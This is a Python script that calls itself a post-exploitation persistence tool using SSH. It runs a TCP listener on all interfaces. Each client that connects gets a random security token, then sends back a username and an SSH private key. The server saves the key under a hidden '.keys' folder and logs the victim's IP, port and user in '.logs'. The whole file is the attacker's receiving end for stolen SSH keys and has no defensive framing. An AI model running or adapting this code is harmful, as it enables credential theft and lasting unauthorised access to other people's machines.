#!/usr/bin/python3
# This Python file uses the following encoding:utf-8
import socket
from sys import exit as ext
from sys import argv
import urllib.request
from time import sleep as slp
import secrets
from datetime import date, datetime
from os.path import join as jn
from os import mkdir, getcwd, path
try:
    from rich.console import Console
except Exception as err:
    print("Error... %s" %(err))
    ext(1)






console = Console()
today = date.today()
_date = today.strftime("%b-%d-%Y")
now = datetime.now()
timestamp = datetime.timestamp(now)
frmt_timestamp = datetime.now().strftime("%H:%M:%S")





def banner():
    banner = '''
   ▄███████▄  ▄██████▄     ▄████████    ▄████████    ▄█    █▄    
  ███    ███ ███    ███   ███    ███   ███    ███   ███    ███   
  ███    ███ ███    ███   ███    █▀    ███    █▀    ███    ███   
  ███    ███ ███    ███   ███          ███         ▄███▄▄▄▄███▄▄ 
▀█████████▀  ███    ███ ▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀  
  ███        ███    ███          ███          ███   ███    ███   
  ███        ███    ███    ▄█    ███    ▄█    ███   ███    ███   
 ▄████▀       ▀██████▀   ▄████████▀   ▄████████▀    ███    █▀
    '''
    console.print(f"[bright_cyan]{banner}[/bright_cyan]")
    console.print("\t", ":cancer:", "[gold3] Post Exploitation Persistence using ssh...[/gold3]\n")
    print("-" * 60 + "\n")


def check_internet_conn():
    console.print("\t[red bold] Checking for Internet Connection...[/red bold]")
    host = "https://www.google.com"
    try:
        urllib.request.urlopen(host)
        console.print("\t\t\nConnection:[green bold] Verfied...[/green bold]\n")
    except:
        console.print("\t\t\nConnection:[red bold] No Internet Connection...[/red bold]\n")
        ext(1)



def help():
    console.print(f"\n\n[red bold]Usage: [/red bold][green bold]{argv[0]} [PORT][/green bold]")
    ext(0)




def generate_sec_key(length):
    return secrets.token_hex(length)




def logger(username, addr, key):
    global log_file
    logs_dir = jn(str(getcwd()), ".logs")
    log_file = jn(logs_dir, _date + ".log")
    try:
        if path.exists(logs_dir) and path.isdir(logs_dir):
            with open(log_file, "+a") as file:
                logs = f"""
                                ---> {frmt_timestamp} <---\n        
    Client IP: {addr[0]}
    Client Port: {addr[1]}
    Client User: {username}
    Security Key: {key}
    SSH Key: {timestamp}_{username}_id_rsa
------------------------------------------------------------------------------------------------\n
                """
                file.write(logs)
            return log_file
        else:
            mkdir(logs_dir)
            with open(log_file, "+a") as file:
                logs = f"""
                                ---> {frmt_timestamp} <---\n        
    Client IP: {addr[0]}
    Client Port: {addr[1]}
    Client User: {username}
    Security Key: {key}
    SSH Key: {timestamp}_{username}_id_rsa
------------------------------------------------------------------------------------------------\n
                """
                file.write(logs)
            return log_file
    except Exception as err:
        console.print("[red bold]Error... %s[/red bold]" %(err))
        ext(1)




def save_key(username, rcvd_key):
    global key_saved
    keys_dir = jn(str(getcwd()), ".keys")
    key_saved = jn(keys_dir, f"{timestamp}_{username}_id_rsa")
    try:
        if path.exists(keys_dir) and path.isdir(keys_dir):
            with open(key_saved, "+w") as file:
                file.write(rcvd_key)
            return key_saved
        else:
            mkdir(keys_dir)
            with open(key_saved, "+w") as file:
                file.write(rcvd_key)
            return key_saved
    except Exception as err:
        console.print("[red bold]Error... %s[/red bold]" %(err))
        ext(1)




def get_ssh__keys(conn, addr, key):
    global username
    Buffer_Size_Min = 1024
    Buffer_Size_Max = 4000
    console.print("[green bold][+][/green bold] [gold1 bold]Exchanging Security key.[/gold1 bold]")
    slp(3)
    try:
        cl_key = conn.recv(Buffer_Size_Min).decode('utf-8')
        if cl_key == key:
            console.print("[green bold][+][/green bold] [sky_blue2 bold]Retrieving SSH keys from Client...[/sky_blue2 bold]")
            username = conn.recv(Buffer_Size_Min).decode('utf-8')
            rcvd_key = conn.recv(Buffer_Size_Max).decode('utf-8')
            save_key(username, rcvd_key)
            slp(3)
            console.print(f"[green bold][+][/green bold] [cyan bold]SSH keys Saved at [yellow]{key_saved}[/yellow]...[/cyan bold]")
            logger(username, addr, key)
            console.print(f"[green bold][+][/green bold] [cyan bold]Logs are Saved at [yellow]{log_file}[/yellow]...[/cyan bold]")
            console.print("[green bold][+][/green bold] [cyan bold]Operation Successful...[/cyan bold]")
            print("-" * 60 )
        else:
            console.print("[red bold][~][/red bold] [misty_rose3 bold]Security Key Mismatch...[/misty_rose3 bold]")
            ext(1)
    except Exception as err:
            console.print("[red bold]Error... %s[/red bold]" %(err))
            ext(1)
    
    


    

def server(port):
    global key
    host = "0.0.0.0"
    try:
        global serv
        console.print("[+] [yellow bold] Creating Socket[/yellow bold]")
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv.bind((host, int(port)))
        console.print("[~] [green bold] Socket Created Successfully[/green bold]")
        serv.listen()
        console.print(f"[~] [green bold] Server is running at [/green bold] [blue bold]{host}[/blue bold]:{port}")
        print("-" * 60 )
        while True:
            try:
                conn, addr = serv.accept()
                with conn:
                    console.print(f"""
        ==> Client Connected Successfully
                IP: {addr[0]}
                Port: {addr[1]} 
                    """)
                    key = str(generate_sec_key(32))
                    conn.send(key.encode())
                    get_ssh__keys(conn, addr, key)
                    conn.close()
            except Exception as err:
                console.print("[red bold]Error... %s[/red bold]" %(err))
                ext(1)
            except KeyboardInterrupt:
                console.print("[red bold] User Interruption...[/red bold]")
                ext(1)
    except Exception as err:
        if "address is not valid" in str(err):
                    console.print("[red bold]Provided IP or Port is not accessible over nternet or blocked...[/red bold]")
                    ext(1)
        else:
            console.print("[red bold]Error... %s[/red bold]" %(err))
            ext(1)
    except KeyboardInterrupt:
        console.print("[red bold] User Interruption...[/red bold]")
        serv.close()
        ext(1)


def main():
    port = argv[1]
    server(port)
    




if __name__ == "__main__":
    args = argv
    banner()
    check_internet_conn()
    if len(args) > 1:
        main()
    else:
    	help()